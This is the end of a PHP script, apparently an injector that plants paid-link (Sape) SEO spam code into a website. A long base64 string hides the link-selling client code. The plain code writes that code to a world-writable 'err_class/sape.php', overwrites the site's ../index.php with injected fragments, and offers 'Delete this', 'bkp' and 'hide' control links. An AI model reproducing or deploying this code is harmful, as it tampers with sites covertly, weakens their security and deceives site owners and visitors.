CAgIH0KCiAgICBwdWJsaWMgZnVuY3Rpb24gX2ZpbGxfbWFzaygkZGF0YSkKICAgIHsKICAgICAgICBnbG9iYWwgJHVubmVjZXNzYXJ5OwogICAgICAgICRsZW4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICA9IHN0cmxlbigkZGF0YVswXSk7CiAgICAgICAgJG1hc2sgICAgICAgICAgICAgICAgICAgICAgICAgICAgID0gc3RyX3JlcGVhdCgkdGhpcy0+X21hc2tfY29kZSwgJGxlbik7CiAgICAgICAgJHVubmVjZXNzYXJ5WyR0aGlzLT5fbWFza19jb2RlXVtdID0gYXJyYXkoCiAgICAgICAgICAgICdtYXNrJyA9PiAkbWFzaywKICAgICAgICAgICAgJ2NvZGUnID0+ICRkYXRhWzBdLAogICAgICAgICAgICAnbGVuJyAgPT4gJGxlbgogICAgICAgICk7CgogICAgICAgIHJldHVybiAkbWFzazsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX2N1dF91bm5lY2Vzc2FyeSgmJGNvbnRlbnRzLCAkY29kZSwgJG1hc2spCiAgICB7CiAgICAgICAgZ2xvYmFsICR1bm5lY2Vzc2FyeTsKICAgICAgICAkdGhpcy0+X21hc2tfY29kZSAgICAgICAgICAgICAgICA9ICRjb2RlOwogICAgICAgICRfdW5uZWNlc3NhcnlbJHRoaXMtPl9tYXNrX2NvZGVdID0gYXJyYXkoKTsKICAgICAgICAkY29udGVudHMgICAgICAgICAgICAgICAgICAgICAgICA9IHByZWdfcmVwbGFjZV9jYWxsYmFjaygkbWFzaywgYXJyYXkoJHRoaXMsICdfZmlsbF9tYXNrJyksICRjb250ZW50cyk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9yZXN0b3JlX3VubmVjZXNzYXJ5KCYkY29udGVudHMsICRjb2RlKQogICAgewogICAgICAgIGdsb2JhbCAkdW5uZWNlc3Nhcnk7CiAgICAgICAgJG9mZnNldCA9IDA7CiAgICAgICAgaWYgKCFlbXB0eSgkdW5uZWNlc3NhcnlbJGNvZGVdKSkgewogICAgICAgICAgICBmb3JlYWNoICgkdW5uZWNlc3NhcnlbJGNvZGVdIGFzICRtZXRhKSB7CiAgICAgICAgICAgICAgICAkb2Zmc2V0ICAgPSBzdHJwb3MoJGNvbnRlbnRzLCAkbWV0YVsnbWFzayddLCAkb2Zmc2V0KTsKICAgICAgICAgICAgICAgICRjb250ZW50cyA9IHN1YnN0cigkY29udGVudHMsIDAsICRvZmZzZXQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAuICRtZXRhWydjb2RlJ10gLiBzdWJzdHIoJGNvbnRlbnRzLCAkb2Zmc2V0ICsgJG1ldGFbJ2xlbiddKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX2N1dF90ZW1wbGF0ZV9saW5rcygkdGVtcGxhdGVfYm9keSkKICAgIHsKICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdtYl9pbnRlcm5hbF9lbmNvZGluZycpICYmIHN0cmxlbigkdGhpcy0+X2NoYXJzZXQpID4gMCkgewogICAgICAgICAgICBtYl9pbnRlcm5hbF9lbmNvZGluZygkdGhpcy0+X2NoYXJzZXQpOwogICAgICAgIH0KICAgICAgICAkbGlua19wYXR0ZXJuICAgID0gJ34oXDxhIFteXD5dKj9ocmVmW15cPl0qP1w9WyJcJ117MCwxfWh0dHBbXlw+XSo/XD4uKj9cPC9hW15cPl0qP1w+fFw8YSBbXlw+XSo/aHJlZlteXD5dKj9cPVsiXCddezAsMX1odHRwW15cPl0qP1w+fFw8YXJlYSBbXlw+XSo/aHJlZlteXD5dKj9cPVsiXCddezAsMX1odHRwW15cPl0qP1w+KX5zaSc7CiAgICAgICAgJGxpbmtfc3VicGF0dGVybiA9ICd+XDxhIHxcPGFyZWEgfnNpJzsKICAgICAgICAkcmVsX3BhdHRlcm4gICAgID0gJ35bXHNdezF9cmVsXD1bIlwnXXsxfVteICJcJ1w+XSo/WyJcJ117MX18IHJlbFw9W14gIlwnXD5dKj9bXHNdezF9fnNpJzsKICAgICAgICAkaHJlZl9wYXR0ZXJuICAgID0gJ35bXHNdezF9aHJlZlw9WyJcJ117MCwxfShodHRwW14gIlwnXD5dKik/WyJcJ117MCwxfSB7MCwxfX5zaSc7CgogICAgICAgICRhbGxvd2VkX2RvbWFpbnMgICA9ICR0aGlzLT5fZGF0YVsnaW5kZXgnXVsnZXh0X2xpbmtzX2FsbG93ZWQnXTsKICAgICAgICAkYWxsb3dlZF9kb21haW5zW10gPSAkdGhpcy0+X2hvc3Q7CiAgICAgICAgJGFsbG93ZWRfZG9tYWluc1tdID0gJ3d3dy4nIC4gJHRoaXMtPl9ob3N0OwogICAgICAgICR0aGlzLT5fY3V0X3VubmVjZXNzYXJ5KCR0ZW1wbGF0ZV9ib2R5LCAnQycsICd8PCEtLSguKj8pLS0+fHNtaScpOwogICAgICAgICR0aGlzLT5fY3V0X3VubmVjZXNzYXJ5KCR0ZW1wbGF0ZV9ib2R5LCAnUycsICd8PHNjcmlwdFtePl0qPi4qPzwvc2NyaXB0PnxzaScpOwogICAgICAgICR0aGlzLT5fY3V0X3VubmVjZXNzYXJ5KCR0ZW1wbGF0ZV9ib2R5LCAnTicsICd8PG5vaW5kZXhbXj5dKj4uKj88L25vaW5kZXg+fHNpJyk7CgogICAgICAgICRzbGljZXMgPSBwcmVnX3NwbGl0KCRsaW5rX3BhdHRlcm4sICR0ZW1wbGF0ZV9ib2R5LCAtMSwgUFJFR19TUExJVF9ERUxJTV9DQVBUVVJFKTsKICAgICAgICAvL9Ce0LHRgNCw0LzQu9GP0LXQvCDQstGB0LUg0LLQuNC00LjQvNGL0LUg0YHRgdGL0LvQutC4INCyIG5vaW5kZXgKICAgICAgICBpZiAoaXNfYXJyYXkoJHNsaWNlcykpIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHNsaWNlcyBhcyAkaWQgPT4gJGxpbmspIHsKICAgICAgICAgICAgICAgIGlmICgkaWQgJSAyID09IDApIHsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCRocmVmX3BhdHRlcm4sICRsaW5rLCAkdXJscykpIHsKICAgICAgICAgICAgICAgICAgICAkcGFyc2VkX3VybCA9IEBwYXJzZV91cmwoJHVybHNbMV0pOwogICAgICAgICAgICAgICAgICAgICRob3N0ICAgICAgID0gaXNzZXQoJHBhcnNlZF91cmxbJ2hvc3QnXSkgPyAkcGFyc2VkX3VybFsnaG9zdCddIDogZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgaWYgKCFpbl9hcnJheSgkaG9zdCwgJGFsbG93ZWRfZG9tYWlucykgfHwgISRob3N0KSB7CiAgICAgICAgICAgICAgICAgICAgICAgIC8v0J7QsdGA0LDQvNC70Y/QtdC8INCyINGC0Y3Qs9C4IG5vaW5kZXgKICAgICAgICAgICAgICAgICAgICAgICAgJHNsaWNlc1skaWRdID0gJzxub2luZGV4PicgLiAkc2xpY2VzWyRpZF0gLiAnPC9ub2luZGV4Pic7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICR0ZW1wbGF0ZV9ib2R5ID0gaW1wbG9kZSgnJywgJHNsaWNlcyk7CiAgICAgICAgfQogICAgICAgIC8v0JLQvdC+0LLRjCDQvtGC0L7QsdGA0LDQttCw0LXQvCDRgdC+0LTQtdGA0LbQuNC80L7QtSDQstC90YPRgtGA0Lggbm9pbmRleAogICAgICAgICR0aGlzLT5fcmVzdG9yZV91bm5lY2Vzc2FyeSgkdGVtcGxhdGVfYm9keSwgJ04nKTsKCiAgICAgICAgLy/Qn9GA0L7Qv9C40YHRi9Cy0LDQtdC8INCy0YHQtdC8INGB0YHRi9C70LrQsNC8IG5vZm9sbG93CiAgICAgICAgJHNsaWNlcyA9IHByZWdfc3BsaXQoJGxpbmtfcGF0dGVybiwgJHRlbXBsYXRlX2JvZHksIC0xLCBQUkVHX1NQTElUX0RFTElNX0NBUFRVUkUpOwogICAgICAgIGlmIChpc19hcnJheSgkc2xpY2VzKSkgewogICAgICAgICAgICBmb3JlYWNoICgkc2xpY2VzIGFzICRpZCA9PiAkbGluaykgewogICAgICAgICAgICAgICAgaWYgKCRpZCAlIDIgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goJGhyZWZfcGF0dGVybiwgJGxpbmssICR1cmxzKSkgewogICAgICAgICAgICAgICAgICAgICRwYXJzZWRfdXJsID0gQHBhcnNlX3VybCgkdXJsc1sxXSk7CiAgICAgICAgICAgICAgICAgICAgJGhvc3QgICAgICAgPSBpc3NldCgkcGFyc2VkX3VybFsnaG9zdCddKSA/ICRwYXJzZWRfdXJsWydob3N0J10gOiBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBpZiAoIWluX2FycmF5KCRob3N0LCAkYWxsb3dlZF9kb21haW5zKSB8fCAhJGhvc3QpIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy/QstGL0YDQtdC30LDQtdC8IFJFTAogICAgICAgICAgICAgICAgICAgICAgICAkc2xpY2VzWyRpZF0gPSBwcmVnX3JlcGxhY2UoJHJlbF9wYXR0ZXJuLCAnJywgJGxpbmspOwogICAgICAgICAgICAgICAgICAgICAgICAvL9CU0L7QsdCw0LLQu9GP0LXQvCByZWw9bm9mb2xsb3cKICAgICAgICAgICAgICAgICAgICAgICAgJHNsaWNlc1skaWRdID0gcHJlZ19yZXBsYWNlKCRsaW5rX3N1YnBhdHRlcm4sICckMHJlbD0ibm9mb2xsb3ciICcsICRzbGljZXNbJGlkXSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICR0ZW1wbGF0ZV9ib2R5ID0gaW1wbG9kZSgnJywgJHNsaWNlcyk7CiAgICAgICAgfQoKICAgICAgICAkdGhpcy0+X3Jlc3RvcmVfdW5uZWNlc3NhcnkoJHRlbXBsYXRlX2JvZHksICdTJyk7CiAgICAgICAgJHRoaXMtPl9yZXN0b3JlX3VubmVjZXNzYXJ5KCR0ZW1wbGF0ZV9ib2R5LCAnQycpOwoKICAgICAgICByZXR1cm4gJHRlbXBsYXRlX2JvZHk7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9pc192YWxpZF90ZW1wbGF0ZSgkdGVtcGxhdGVfYm9keSkKICAgIHsKICAgICAgICBmb3JlYWNoICgkdGhpcy0+X2RhdGFbJ2luZGV4J11bJ3RlbXBsYXRlX3JlcXVpcmVkX2ZpZWxkcyddIGFzICRmaWVsZCkgewogICAgICAgICAgICBpZiAoc3RycG9zKCR0ZW1wbGF0ZV9ib2R5LCAneycgLiAkZmllbGQgLiAnfScpID09PSBmYWxzZSkgewogICAgICAgICAgICAgICAgJHRoaXMtPl90ZW1wbGF0ZV9lcnJvciA9ICfQkiDRiNCw0LHQu9C+0L3QtSDQvdC1INGF0LLQsNGC0LDQtdGCINC/0L7Qu9GPICcgLiAkZmllbGQgLiAnLic7CgogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX3JldHVybl9odG1sKCRodG1sKQogICAgewogICAgICAgIGlmICgkdGhpcy0+X2hlYWRlcnNfZW5hYmxlZCkgewogICAgICAgICAgICBoZWFkZXIoJ0hUVFAvMS54IDIwMCBPSycpOwogICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5fY2hhcnNldCkpIHsKICAgICAgICAgICAgICAgIGhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9JyAuICR0aGlzLT5fY2hhcnNldCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHJldHVybiAkaHRtbDsKICAgIH0KCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gX3JldHVybl9ub3RfZm91bmQoKQogICAgewogICAgICAgIGhlYWRlcignSFRUUC8xLnggNDA0IE5vdCBGb3VuZCcpOwogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfZ2V0X2Rpc3BlbnNlcl9wYXRoKCkKICAgIHsKICAgICAgICBzd2l0Y2ggKCR0aGlzLT5fcmVxdWVzdF9tb2RlKSB7CiAgICAgICAgICAgIGNhc2UgJ2luZGV4JzoKICAgICAgICAgICAgICAgIHJldHVybiAnLz91c2VyPScgLiBfU0FQRV9VU0VSIC4gJyZob3N0PScgLgogICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5faG9zdCAuICcmcnR5cGU9JyAuICR0aGlzLT5fcmVxdWVzdF9tb2RlOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2FydGljbGUnOgogICAgICAgICAgICAgICAgcmV0dXJuICcvP3VzZXI9JyAuIF9TQVBFX1VTRVIgLiAnJmhvc3Q9JyAuCiAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPl9ob3N0IC4gJyZydHlwZT0nIC4gJHRoaXMtPl9yZXF1ZXN0X21vZGUgLiAnJmFydGlkPScgLiAkdGhpcy0+X2FydGljbGVfaWQ7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnaW1hZ2UnOgogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5pbWFnZV91cmw7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9zZXRfcmVxdWVzdF9tb2RlKCRtb2RlKQogICAgewogICAgICAgICR0aGlzLT5fcmVxdWVzdF9tb2RlID0gJG1vZGU7CiAgICB9CgogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIF9nZXRfZGJfZmlsZSgpCiAgICB7CiAgICAgICAgaWYgKCR0aGlzLT5fbXVsdGlfc2l0ZSkgewogICAgICAgICAgICByZXR1cm4gZGlybmFtZShfX0ZJTEVfXykgLiAnLycgLiAkdGhpcy0+X2hvc3QgLiAnLicgLiAkdGhpcy0+X3NhdmVfZmlsZV9uYW1lOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBkaXJuYW1lKF9fRklMRV9fKSAuICcvJyAuICR0aGlzLT5fc2F2ZV9maWxlX25hbWU7CiAgICAgICAgfQogICAgfQoKICAgIHByb3RlY3RlZCBmdW5jdGlvbiBfc2V0X2RhdGEoJGRhdGEpCiAgICB7CiAgICAgICAgJHRoaXMtPl9kYXRhWyR0aGlzLT5fcmVxdWVzdF9tb2RlXSA9ICRkYXRhOwogICAgICAgIC8v0JXRgdGC0Ywg0LvQuCDQvtCx0Y/Qt9Cw0YLQtdC70YzQvdGL0Lkg0LLRi9Cy0L7QtAogICAgICAgIGlmIChpc3NldCgkZGF0YVsnX19zYXBlX3BhZ2Vfb2JsaWdhdG9yeV9vdXRwdXRfXyddKSkgewogICAgICAgICAgICAkdGhpcy0+X3BhZ2Vfb2JsaWdhdG9yeV9vdXRwdXQgPSAkZGF0YVsnX19zYXBlX3BhZ2Vfb2JsaWdhdG9yeV9vdXRwdXRfXyddOwogICAgICAgIH0KICAgIH0KfQo=';



//если еще не бэкапили, бэкапим
if ((file_exists("../index.php")) and (!file_exists("bkp_index.php"))) copy("../index.php", "bkp_index.php");

if (!is_dir('err_class')) mkdir('err_class', 0777); 
chmod('err_class', 0777);
file_put_contents('err_class/sape.php',  base64_decode($sape_file));

if (strpos('linkfeed', $content)===false) 
		file_put_contents('../index.php', $verh.$sapeid1.$centrh1.$_SERVER['HTTP_HOST'].$centrh2.$tag.$niz.$content);



echo '<a href="?del=1">Delete this</a>' ;
echo '<br><a href="?bkp=1">bkp</a>';
echo '<br><a href="?yestag=fff">hide</a>';
echo '<br><br><br><a target="_blank" href="http://'.$_SERVER['HTTP_HOST'].'"><h1>'.$_SERVER['HTTP_HOST'].'</h1></a><br><a href="?p==">?p==</a><br><br>';
